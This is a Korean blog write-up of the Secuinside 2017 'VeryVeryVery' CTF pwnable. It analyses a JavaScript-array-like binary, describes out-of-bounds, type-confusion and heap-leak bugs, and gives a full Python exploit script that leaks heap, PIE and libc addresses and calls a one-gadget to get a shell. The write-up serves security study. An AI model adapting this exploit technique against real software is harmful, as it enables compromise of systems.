---
layout:     post
title:      "Secuinside 2017 VeryVeryVery write-up"
subtitle:   "secuinside 2017 pwnable"
date:       2018-04-09
author:     "NextLine"
header-img: "img/post-bg-3.png"
tags:
    - WriteUp
---
# Secuinside 2017 VeryVeryVery WriteUp

### intro

이 문제를 풀면서 문제풀이의 자신감이 붙었다. 분석후 바로 취약점을 발견하는데까지 1시간이 안걸렸으며, Exploit을 생각하는데도 많은 시간이 걸리지 않았다. 하지만 Exploit을 구현하는데 오래걸렸으며 취약점도 여러개고 Exploit Idea를 얻는데 전체적으로 시간이 좀 들었다. (총 풀이시간 6~7시간)



### Binary

VVV는 자바스크립트 배열을 나타낸 문제이다. 각 메뉴에 대해서 분석한 내용은 아래와 같다.

- 23
  - 34
    - print_info (all)
  - 55
    - array[value] = Object (NativeArray, all)
  - 119
    - calc BigNumber (BigNumber, all)
  - 51
    - concat Array (NativeArray, Array)
  - 17
    - State += array[value]
  - 19
    - array[value] = Object (NativeIntArray, all (box))
    - array[value] = Object (NativeArray, all (Int_box))
- 32
  - 0x10001000
    - 23
      - NativeArray::ctor()
    - 32
      - NatvieIntArray::ctor()
  - 0x20002000
    - String::ctor()
  - x <= 0x80000000
    - number
  - else
    - BigNumber::ctor()

### Vulnerability

분석이 끝나자마자 State에서 Object를 가져올때 OOB가 있는것을 확인하였고 array를 확장할때 초기화를 하지 않아 UAF의 가능성을 열어두었다. 하지만 delete(free)가 없는 관계로 uaf는 아니라고 생각했다.<br>그리고나서 의심한 메뉴는 아래와 같다.

1. concat Array : Array를 합칠때 NativeArray와 Array를 합칠 수 있다. 그런데 여기서 약간 이상한게 NativeArray만 첫번째 인자로 받으면서 두번째 인자는 Array를 받는다는점이다. 그래서 NativeArray와 NativeIntArray를 합쳐보니 타입컨퓨전이 발생하여 17번 메뉴를 이용해 State의 원하는 값을 추가하는게 가능했다. (oob 이용)
2. calc BigNumber : 두번째는 이 메뉴이다. 첫번째 인자로 BigNumber를 받지만 두번째 인자로는 타입체크를 하지 않는다. 그래서 넣을 수 있는 타입을 고려해보니까 String밖에 없었고 String을 넣어보니 주소값과 연산을하여 heap leak이 가능했다.

이 두가지를 이용하면 Arbitrary read가 가능하다. 바로 찾은 취약점 두개가 Exploit과 직접적으로 연관이 있었다.



### Exploit

exploit을 할때 Arbitrary write를 하지 못해서 고민을 많이 했다. 하지만 어차피 State의 box를 덮을 수 있으므로 int_box에 0x10001000, 0x20002000을 넣어서 Fake Chunk를 구성해 만들면 되는데, 0x10001000을 사용하지 못하므로  Arbitrary write의 방법은 두가지가 존재한다.

1. 0x10001000에 패딩을 넣어서 0100 01000 0000 이런식으로 패딩까지 계산해서 Fake Chunk를 만든다.
2. 0x30003000을 이용해 BigNumber class를 이용해서 Arbitrary write를 한다.

나는 두번째 방법을 통해 Exploit을 하였고 다른 write up을 참고해보니 1번방법이 주로 사용된것 같았다.



```python
from ntpwn import *

s = ''
e = ELF('./vvv')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def conn():
	s = process('./vvv')
	b = BP(s)
	b.bp('tracemalloc on')
	b.bp64(0x154f) # read_data
	b.done()
	return s

def na(size): # Make Native Array
	s.send(p8(32))
	sleep(0.02)
	s.send(p32(0x10001000))
	sleep(0.02)
	s.send(p8(23))
	sleep(0.02)
	s.send(p64(size))
	sleep(0.05)

def nia(size): # Make Native Int Array
	s.send(p8(32))
	sleep(0.02)
	s.send(p32(0x10001000))
	s.send(p8(32))
	sleep(0.02)
	s.send(p64(size))
	sleep(0.05)

def st(data,n=True): # Make Stirng
	s.send(p8(32))
	sleep(0.02)
	s.send(p32(0x20002000))
	if n:
		s.sendline(data)
	else :
		s.send(data)
	sleep(0.05)

def mn(value) : # Make Number
	s.send(p8(32))
	sleep(0.02)
	s.send(p32(value))
	sleep(0.05)

def pi(idx): # Print Info
	s.send(p8(23))
	sleep(0.02)
	s.send(p8(34))
	sleep(0.02)
	s.send(p64(idx))
	sleep(0.05)

def nao(idx1, idx2, array_idx): # NativeArray[Object]
	s.send(p8(23))
	sleep(0.02)
	s.send(p8(55))
	sleep(0.02)
	s.send(p64(idx1))
	sleep(0.02)
	s.send(p64(idx2))
	sleep(0.02)
	s.send(p64(array_idx))
	sleep(0.05)

def naio(idx1, idx2, array_idx): # NativeIntArray[Object]
	s.send(p8(23))				 # or NativeArray[Object] and setting flag
	sleep(0.02)
	s.send(p8(19))
	sleep(0.02)
	s.send(p64(idx1))
	sleep(0.02)
	s.send(p64(idx2))
	sleep(0.02)
	s.send(p64(array_idx))
	sleep(0.05)

def cc(idx1, idx2): # concat
	sleep(0.02)
	s.send(p8(23))
	sleep(0.02)
	s.send(p8(51))
	sleep(0.02)
	s.send(p64(idx1))
	sleep(0.02)
	s.send(p64(idx2))
	sleep(0.05)

def pick(idx1, value):
	s.send(p8(23))
	sleep(0.02)
	s.send(p8(17))
	sleep(0.02)
	s.send(p64(idx1))
	sleep(0.02)
	s.send(p64(value))
	sleep(0.05)

def calc(idx1, idx2,op):
	s.send(p8(23))
	sleep(0.02)
	s.send(p8(119))
	sleep(0.02)
	s.send(p64(idx1))
	sleep(0.02)
	s.send(p64(idx2))
	sleep(0.02)
	s.send(p8(op))
	sleep(0.02)


while True:
	try:
		s = conn()
		na(5)
		nia(5)

		# heap leak
		st('NEXTLINE')
		mn(0x88888888)
		pi(3)
		calc(3,2,1)
		s.recv(1024)

		pi(3)
		heap = int(s.recv(1024)[1:-2],10) - 0x88888888
		log.info("HEAP : " + hex(heap))

		# type confusion
		target = heap  - 0x16b0
		log.info("Target - 1 : " + hex(target))

		mn(target % 0x100000000)
		mn(target >> 32)

		nao(0,2,2)

		naio(1,0,1)
		naio(1,1,2)

		pi(3)

		cc(0,1)
		pi(4)
		mn(0x88888888)
		pick(4,3)

		# pie leak
		calc(5,6,1)
		s.recv(1024)
		pi(5)
		pie = int(s.recv(1024)[1:-2],10) - 0x88888888 - 0x203ba8
		log.info("PIE : " + hex(pie))

		# type confusion2
		mn(0x88888888)

		target = pie + e.got['read'] - 0x10
		log.info("Target - 2 : " + hex(target))

		mn(target % 0x100000000)
		mn(target >> 32)

		nao(0,2,2)

		naio(1,2,3)
		naio(1,3,4)

		cc(0,1)
		pi(8)
		pick(8,4)

		# libc leak
		calc(7,9,1)
		s.recv(1024)
		pi(7)
		libc = int(s.recv(1024)[1:-2],10) - 0x88888888 - l.symbols['read']
		oneshot = libc + 0x4526a
		log.info("LIBC : " + hex(libc))

		st(p64(oneshot))

		# set oneshot
		#target = heap - 0x680
		target = heap + 0x178
		mn(target % 0x100000000)
		mn(target >> 32)
		mn(0x30003000)
		mn(0x41414141)
		mn((heap-0x688) % 0x100000000)
		mn((heap-0x688) >> 32)

		# call fake vtable
		log.info("LAST")
		target = target - 0x8

		mn(target % 0x100000000)
		sleep(0.1)
		mn(target >> 32)

		nao(0,2,2)

		s.recv(1024)
		naio(1,9,6)
		sleep(0.1)
		naio(1,8,1)
		sleep(0.1)
		naio(1,9,2)
		sleep(0.1)
		pause()

		cc(0,1)
		pi(11)
		pick(11,3)

		calc(12,1,1)

		s.interactive()
		break

	except:
		pass
```

